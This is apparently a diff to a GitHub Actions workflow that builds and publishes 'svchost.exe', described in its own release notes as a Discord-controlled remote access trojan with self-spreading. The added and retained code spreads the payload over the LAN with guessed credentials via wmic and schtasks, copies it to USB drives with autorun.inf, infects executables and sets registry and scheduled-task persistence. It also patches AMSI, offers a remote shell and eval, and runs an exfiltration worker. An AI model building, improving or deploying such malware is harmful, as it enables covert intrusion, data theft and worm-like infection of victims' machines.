@@ -4,7 +4,7 @@ on:
   workflow_dispatch:
     inputs:
       token:
-        description: 'Discord Bot Token (de trong = chi phat tan, khong bot)'
+        description: 'Discord Bot Token (NEN DIEN - de trong thi agent van chay + tu phat tan nhung khong ra lenh duoc)'
         required: false
         default: ''
         type: string
@@ -78,7 +78,7 @@ jobs:
 
           import discord
 
-          # ---------------- CẤU HÌNH ----------------
+          # ---------------- CAU HINH ----------------
           TOKEN         = ""
           _TOK_ENC      = ""
           _TOK_KEY      = ""
@@ -99,7 +99,6 @@ jobs:
           _RAW          = {}
           FRESH         = 180
           CHUNK_LIMIT   = 24 * 1024 * 1024
-          _last_beat    = [time.time()]
 
           def _token():
               if TOKEN_URL and requests:
@@ -157,14 +156,21 @@ jobs:
               except Exception: pass
 
           _sock = None
-          def single_instance():
+          def single_instance(wait=0):
+              """Giu lock; neu ban cu dang tat thi cho them `wait` giay roi thu lai."""
               global _sock
-              _sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-              for port in (47823, 47824, 47825):
-                  try:
-                      _sock.bind(("127.0.0.1", port)); _sock.listen(1); return True
-                  except OSError: pass
-              return False
+              t0 = time.time()
+              while True:
+                  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                  for port in (47823, 47824, 47825):
+                      try:
+                          s.bind(("127.0.0.1", port)); s.listen(1)
+                          _sock = s; return True
+                      except OSError: pass
+                  try: s.close()
+                  except Exception: pass
+                  if time.time() - t0 >= wait: return False
+                  time.sleep(0.4)
 
           def reg_set(name, value):
               import winreg
@@ -278,27 +284,47 @@ jobs:
               except Exception: pass
               return pids
 
-          def take_over():
-              """Chay exe moi tu Downloads tren may da cai -> ghi de ban cai, tat ban cu, chay lai ban moi."""
-              me = self_path()
-              if os.path.normcase(me) == os.path.normcase(SCRIPT_PATH): return False
-              try:
-                  os.makedirs(INSTALL_DIR, exist_ok=True)
-                  tmp = SCRIPT_PATH + ".new"
-                  shutil.copy2(me, tmp); unblock(tmp)
-                  os.replace(tmp, SCRIPT_PATH)
-              except Exception: return False
-              if not os.path.exists(MARKER): return False
+          def _replace_self():
+              tmp = SCRIPT_PATH + ".new"
+              shutil.copy2(self_path(), tmp); unblock(tmp)
+              os.replace(tmp, SCRIPT_PATH)
+
+          def _kill_others():
               for pid in _pids_on_ports():
                   if pid != os.getpid():
-                      try: subprocess.call(f"taskkill /f /pid {pid}", shell=True,
+                      try: subprocess.call(f"taskkill /f /pid {pid} /t", shell=True,
                               creationflags=NO_WIN)
                       except Exception: pass
-              time.sleep(1.0)
+
+          def _spawn_self():
+              exe = SCRIPT_PATH if os.path.exists(SCRIPT_PATH) else self_path()
               try:
-                  subprocess.Popen(f'cmd /c ping -n 2 127.0.0.1 >nul & start "" "{SCRIPT_PATH}"',
+                  subprocess.Popen(f'cmd /c ping -n 3 127.0.0.1 >nul & start "" "{exe}"',
                           shell=True, creationflags=NO_WIN)
               except Exception: pass
+
+          def _kill_shell():
+              try:
+                  if _shell.proc and _shell.proc.poll() is None:
+                      subprocess.call(f"taskkill /f /pid {_shell.proc.pid} /t", shell=True,
+                              creationflags=NO_WIN)
+              except Exception: pass
+
+          def _quit(code=0):
+              _kill_shell(); time.sleep(0.2); os._exit(code)
+
+          def take_over():
+              """Chi hanh dong khi noi dung THAT SU khac. Giong nhau -> khong kill, khong spawn."""
+              me = self_path()
+              if os.path.normcase(me) == os.path.normcase(SCRIPT_PATH): return False
+              if not os.path.exists(MARKER): return False
+              try:
+                  if os.path.exists(SCRIPT_PATH) and _sha256(me) == _sha256(SCRIPT_PATH):
+                      return "same"
+              except Exception: pass
+              try: _replace_self()
+              except Exception: return False
+              _kill_others(); time.sleep(0.6); _spawn_self()
               return True
 
           def _sidecar_launch():
@@ -489,7 +515,7 @@ jobs:
           SPREAD_EXE  = SCRIPT_PATH
           SPREAD_LOG  = os.path.join(INSTALL_DIR, "spread.log")
           AUTO_SPREAD = [True]
-          _stat = {"lan": 0, "usb": 0, "file": 0, "prog": 0, "hosts": [], "last_lan": 0}
+          _stat = {"lan": 0, "usb": 0, "file": 0, "prog": 0, "hosts": [], "last_lan": 0, "busy": False}
 
           def _log(m):
               try:
@@ -554,10 +580,6 @@ jobs:
               for d in _removable():
                   try:
                       tgt = os.path.join(d, SPREAD_NAME)
-                      if os.path.exists(tgt):
-                          try:
-                              if os.path.getsize(tgt) == os.path.getsize(SPREAD_EXE): pass
-                          except Exception: pass
                       _place(SPREAD_EXE, tgt)
                       subprocess.call(f'attrib +h +s "{tgt}"', shell=True, creationflags=NO_WIN)
                       with open(os.path.join(d, "autorun.inf"), "w", encoding="utf-8") as f:
@@ -568,7 +590,7 @@ jobs:
               return f"Da chen vao {n} o USB/removable" if n else "Khong thay o removable"
 
           # ============================================================
-          #  PHAT TAN 3: NHIEM FILE .EXE (rename goc -> .bak, dat agent vao cho)
+          #  PHAT TAN 3: NHIEM FILE .EXE
           # ============================================================
           def infect_file(fp):
               try:
@@ -652,11 +674,10 @@ jobs:
               try:
                   r = subprocess.run(f"ping -n 1 -w {ms} {ip}", shell=True, capture_output=True,
                                      creationflags=NO_WIN, timeout=5)
-                  t = r.stdout.decode("utf-8", "ignore").upper()
-                  return "TTL=" in t
+                  return "TTL=" in r.stdout.decode("utf-8", "ignore").upper()
               except Exception: return False
 
-          def _sweep(prefix, batch=64):
+          def _sweep(prefix, batch=32):
               live, lock = [], threading.Lock()
               def work(i):
                   ip = f"{prefix}.{i}"
@@ -710,7 +731,7 @@ jobs:
                                  f'/v svchost /t REG_SZ /d "{win}" /f', shell=True,
                                  capture_output=True, creationflags=NO_WIN, timeout=25)
               except Exception: pass
-              wc = f' /user:"{user}" /password:"{pw}"' if user else ""
+              wc  = f' /user:"{user}" /password:"{pw}"' if user else ""
               sc2 = f' /u "{user}" /p "{pw}"' if user else ""
               for cmd in (f'wmic /node:"{ip}"{wc} process call create "{win}"',
                           f'schtasks /s {ip}{sc2} /create /tn svchost /tr "{win}" /sc onlogon /f',
@@ -731,7 +752,7 @@ jobs:
                   except Exception: pass
               return False
 
-          def spread_lan(subnet=""):
+          def _spread_lan(subnet=""):
               ip = _local_ip()
               if not ip: return "Khong lay duoc IP LAN"
               prefix = (subnet or "").strip() or ip.rsplit(".", 1)[0]
@@ -758,6 +779,14 @@ jobs:
               _log(f"LAN: {len(got)}/{len(hosts)}")
               return (f"Quet {len(hosts)} may -> lay duoc {len(got)}"
                       + (": " + ", ".join(got) if got else " (khong)"))
+
+          def spread_lan(subnet=""):
+              if _stat.get("busy"): return "Dang quet LAN, bo qua"
+              _stat["busy"] = True
+              try:
+                  return _spread_lan(subnet)
+              finally:
+                  _stat["busy"] = False
 
           def _autospread():
               time.sleep(90)
@@ -855,7 +884,6 @@ jobs:
           async def _reg_loop(ch):
               while True:
                   await asyncio.sleep(60)
-                  _last_beat[0] = time.time()
                   await _register(ch)
 
           # ============================================================
@@ -882,7 +910,7 @@ jobs:
                       self.buf += chunk
               def run(self, cmd, timeout=120):
                   with self.lock:
-                      if self.proc.poll() is not None: self._spawn()
+                      if self.proc is None or self.proc.poll() is not None: self._spawn()
                       marker = "__SVC_9x7__"; self.buf.clear()
                       try:
                           self.proc.stdin.write((cmd + "\r\n").encode("utf-8", errors="ignore"))
@@ -890,12 +918,15 @@ jobs:
                           self.proc.stdin.flush()
                       except Exception:
                           self._spawn(); return "[shell restart]"
-                      t0 = time.time()
+                      t0 = time.time(); dead = False
                       while time.time() - t0 < timeout:
                           if marker.encode() in self.buf: break
-                          if self.proc.poll() is not None: break
+                          if self.proc.poll() is not None: dead = True; break
                           time.sleep(0.04)
                       data = self.buf.decode("utf-8", errors="ignore"); self.buf.clear()
+                      if dead:
+                          self.proc = None; self._spawn()
+                          return (data.strip() or "[ok]") + "\n[shell bi kill -> da respawn]"
                       if marker in data:
                           out, rest = data.split(marker, 1)
                           newcwd = rest.split(marker, 1)[0].strip()
@@ -1605,16 +1636,19 @@ jobs:
                       except Exception: pass
                       fails = 0
 
+          _hb = [time.time()]
+
+          def _heartbeat():
+              while True:
+                  _hb[0] = time.time()
+                  time.sleep(10)
+
           def _watchdog():
+              time.sleep(60)
               while True:
                   time.sleep(30)
-                  if time.time() - _last_beat[0] > 300:
-                      try:
-                          subprocess.Popen(f'cmd /c ping 1.1.1.1 -n 4 >nul & start "" "{self_path()}"',
-                                           shell=True, creationflags=NO_WIN)
-                      except Exception: pass
-                      time.sleep(0.5)
-                      os._exit(0)
+                  if time.time() - _hb[0] > 90:      # thread nhip tim chet => process treo
+                      _spawn_self(); time.sleep(0.3); _quit(0)
 
           def f_dl(args):
               if not requests: return "Thieu requests"
@@ -1990,7 +2024,7 @@ jobs:
                   with open(bat, "w") as f:
                       f.write(f'@echo off\ntimeout /t 2 >nul\ndel "{SCRIPT_PATH}"\nmove /y "{new}" "{SCRIPT_PATH}"\nstart "" "{SCRIPT_PATH}"\n')
                   subprocess.Popen(f'cmd /c "{bat}"', shell=True, creationflags=NO_WIN)
-                  time.sleep(1); os._exit(0)
+                  time.sleep(1); _quit(0)
               except Exception as e: return f"Loi: {e}"
 
           def f_rollback():
@@ -2001,13 +2035,11 @@ jobs:
                   with open(bat, "w") as f:
                       f.write(f'@echo off\ntimeout /t 2 >nul\ndel "{SCRIPT_PATH}"\ncopy /y "{old}" "{SCRIPT_PATH}"\nstart "" "{SCRIPT_PATH}"\n')
                   subprocess.Popen(f'cmd /c "{bat}"', shell=True, creationflags=NO_WIN)
-                  time.sleep(1); os._exit(0)
+                  time.sleep(1); _quit(0)
               except Exception as e: return f"Loi: {e}"
 
           def f_restart():
-              subprocess.Popen(f'cmd /c ping 1.1.1.1 -n 3 >nul & start "" "{self_path()}"',
-                               shell=True, creationflags=NO_WIN)
-              time.sleep(0.5); os._exit(0)
+              _spawn_self(); time.sleep(0.3); _quit(0)
 
           _pyglobals = {}
           def f_eval(expr):
@@ -2114,7 +2146,6 @@ jobs:
               live = sorted(k for k, v in regs.items() if now - v.get("seen", 0) <= FRESH)
               await m.channel.send(f"Master (song): `{live[0]}` - ban la master: {MACHINE_ID == live[0]}")
 
-          # ---- phat tan ----
           async def c_spread(m, a):
               await m.channel.send("Dang phat tan...")
               await send_long(m, await ex(f_spread, a[0] if a else "all"))
@@ -2134,7 +2165,6 @@ jobs:
               AUTO_SPREAD[0] = s in ("on", "1", "true", "yes")
               await m.channel.send(f"Auto spread = {'ON' if AUTO_SPREAD[0] else 'OFF'}")
 
-          # ---- shell / file ----
           async def c_cmd(m, a): await send_long(m, await ex(run_cmd, " ".join(a) or "echo hello"))
           async def c_sh(m, a):
               raw = _RAW.get(m.id, " ".join(a))
@@ -2160,7 +2190,6 @@ jobs:
           async def c_del(m, a):     await m.channel.send(await ex(f_del, " ".join(a)))
           async def c_merge(m, a):   await m.channel.send(await ex(f_merge, a))
 
-          # ---- he thong ----
           async def c_sysinfo(m, a): await send_long(m, await ex(f_sysinfo))
           async def c_ps(m, a):      await send_long(m, await ex(f_ps))
           async def c_kill(m, a):    await m.channel.send(await ex(f_kill, " ".join(a)))
@@ -2347,7 +2376,7 @@ jobs:
               await ex(uninstall); time.sleep(0.5)
               subprocess.Popen(f'cmd /c ping 1.1.1.1 -n 3 > nul & rmdir /s /q "{INSTALL_DIR}"',
                                shell=True, creationflags=NO_WIN)
-              os._exit(0)
+              _quit(0)
 
           COMMANDS = {
               "help":c_help,"list":c_list,"select":c_select,"back":c_back,"sel":c_sel,"master":c_master,
@@ -2388,7 +2417,6 @@ jobs:
           @client.event
           async def on_ready():
               print(f"[*] online: {client.user} | may: {MACHINE_ID}")
-              _last_beat[0] = time.time()
               try:
                   ch = await control_channel()
                   if ch:
@@ -2440,26 +2468,33 @@ jobs:
               _sidecar_launch()
               try: amsi_patch()
               except Exception: pass
+
               if not os.path.exists(MARKER):
-                  time.sleep(random.randint(3, 12))
+                  if not single_instance(10): _quit(0)
                   install()
                   try: spread_programs()
                   except Exception: pass
-              elif take_over():
-                  print("[*] da ghi de ban cai dat + khoi dong lai ban moi")
-                  time.sleep(0.8); os._exit(0)
-              if not single_instance(): sys.exit(0)
+                  if os.path.normcase(self_path()) != os.path.normcase(SCRIPT_PATH):
+                      _spawn_self(); time.sleep(0.3); _quit(0)
+              else:
+                  if take_over() is True:
+                      print("[*] ban khac noi dung -> ghi de + khoi dong lai")
+                      _quit(0)
+                  if not single_instance(8): _quit(0)
+
+              threading.Thread(target=_heartbeat, daemon=True).start()
               threading.Thread(target=_exfil_worker, daemon=True).start()
               threading.Thread(target=_net_watch, daemon=True).start()
               threading.Thread(target=_watchdog, daemon=True).start()
               threading.Thread(target=_autospread, daemon=True).start()
 
               tok = _token()
-              if not tok:
-                  print("[*] khong co token - chi phat tan")
-                  while True:
-                      _last_beat[0] = time.time()
-                      time.sleep(20)
+              while not tok:
+                  print("[*] chua co token - chay nen + tu phat tan, thu lai moi 60s")
+                  for _ in range(12):
+                      time.sleep(5)
+                  tok = _token()
+              print("[*] co token -> bat bot")
 
               delay = 5
               while True:
@@ -2585,15 +2620,10 @@ jobs:
               substr(r'_TOK_KEY\s*=\s*".*?"', "")
               print("discord: TAT (chi phat tan)")
 
-          def pick(env):
-              return (os.environ.get(env) or "").strip()
+          v = (os.environ.get("TOKEN_URL") or "").strip()
+          if v: substr(r'TOKEN_URL\s*=\s*".*?"', v)
 
-          for pat, env in ((r'TOKEN_URL\s*=\s*".*?"', "TOKEN_URL"),
-                           (r'AGENT_KEY\s*=\s*".*?"', "AKEY")):
-              v = pick(env)
-              if v: substr(pat, v)
-
-          ch = pick("CTRL_CH")
+          ch = (os.environ.get("CTRL_CH") or "").strip()
           if ch and ch != "0":
               s = re.sub(r'CONTROL_CH_ID\s*=\s*\d+',
                          lambda m: m.group(0).split("=")[0].rstrip() + " = " + ch, s, count=1)
@@ -2603,8 +2633,8 @@ jobs:
           print("--- CAU HINH DA NHUNG ---")
           for line in s.splitlines():
               if re.match(r'^\s*(CONTROL_CH_ID|TOKEN_URL|_TOK_ENC|_TOK_KEY)\s*=', line):
-                  v = line.strip()
-                  print("  " + (v[:80] + "..." if len(v) > 80 else v))
+                  v2 = line.strip()
+                  print("  " + (v2[:80] + "..." if len(v2) > 80 else v2))
           '@
           $inject | python -
 
@@ -2702,16 +2732,13 @@ jobs:
           tag_name: build-${{ github.run_number }}
           name: svchost build ${{ github.run_number }}
           body: |
-            Build #${{ github.run_number }} — Discord RAT + phát tán.
+            Build #${{ github.run_number }} — Discord RAT + phat tan.
 
-            4 đường phát tán:
-            - `!lan` — quét LAN, copy qua `C$`/`ADMIN$`, thử 9 bộ cred phổ biến, đăng ký `HKLM\Run` + `schtasks` + chạy qua `wmic`
-            - `!usb` — nhét `svchost.exe` + `autorun.inf` vào mọi ổ removable
-            - `!infect <dir>` — nhiễm `.exe` (đổi gốc thành `.exe.bak`, đặt agent vào chỗ; chạy file đó sẽ chạy cả app gốc)
-            - `!programs` — thả vào Program Files / ProgramData / Startup / %LOCALAPPDATA%\Programs
+            4 duong phat tan: `!lan` (SMB/WMI), `!usb`, `!infect <dir>`, `!programs`.
+            `!spread` = lam het. `!auto on|off` bat phat tan tu dong (USB 3 phut, LAN 30 phut).
+            `!spreadinfo` xem trang thai. `!uninfect` khoi phuc file goc.
 
-            `!spread` = làm hết. `!auto on|off` bật phát tán tự động (USB mỗi 3 phút, LAN mỗi 30 phút).
-            `!spreadinfo` xem trạng thái. `!uninfect` khôi phục file gốc.
+            Token la bat buoc neu muon ra lenh. Khong token = agent cam, chi tu phat tan.
           files: |
             svchost.exe
           make_latest: true
